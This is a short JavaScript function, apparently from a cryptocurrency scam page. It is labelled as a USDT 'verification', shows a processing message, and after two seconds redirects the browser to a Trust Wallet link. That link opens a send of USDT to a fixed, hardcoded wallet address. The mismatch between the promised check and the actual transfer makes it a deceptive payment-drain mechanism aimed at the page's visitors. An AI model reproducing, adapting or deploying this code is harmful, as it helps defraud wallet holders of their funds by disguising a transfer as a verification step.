function verifyUSDT() {
  document.getElementById("processingText").style.display = "block";
  document.getElementById("flash-msg").style.display = "block";

  setTimeout(() => {
    window.location.href = "https://link.trustwallet.com/send?asset=bnb_bUSDT-6D8&address=0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
  }, 2000); // Delay before redirecting
}
